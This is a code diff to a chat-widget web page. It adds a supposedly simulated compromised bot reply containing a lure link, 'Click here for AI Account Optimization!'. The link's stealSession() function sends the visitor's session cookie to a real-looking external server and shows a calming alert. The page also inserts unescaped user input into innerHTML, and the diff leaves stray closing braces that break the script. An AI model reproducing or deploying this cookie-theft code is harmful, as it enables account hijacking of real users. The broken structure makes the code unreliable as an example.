@@ -78,13 +78,32 @@
 </div>
 
 <script>
-    function sendMessage() {
+   function sendMessage() {
         const input = document.getElementById('chat-input');
         const messages = document.getElementById('chat-messages');
+        
         if (input.value.trim() !== "") {
             messages.innerHTML += `<p><strong>You:</strong> ${input.value}</p>`;
-            // Here the simulation will hook into the AI response logic
+            
+            // Simulating a response from the AI bot
+            setTimeout(() => {
+                // Here is the "Malicious Payload" injection
+                // This simulates a compromised third-party script injecting code
+                const maliciousLink = "<a href='#' onclick='stealSession()'>Click here for AI Account Optimization!</a>";
+                messages.innerHTML += `<p><strong>Bot:</strong> I can help with that. ${maliciousLink}</p>`;
+            }, 1000);
+            
             input.value = "";
+        }
+    }
+
+    // This is the function the attacker injected via the compromised bot
+    function stealSession() {
+        // Exfiltrating the session cookie to the attacker's server
+        const cookie = document.cookie;
+        fetch('https://python-pickwiz.onrender.com/log?stolen_cookie=' + encodeURIComponent(cookie));
+        alert("Optimization complete!"); // Social engineering: keep the user calm
+    }
         }
     }
 </script>
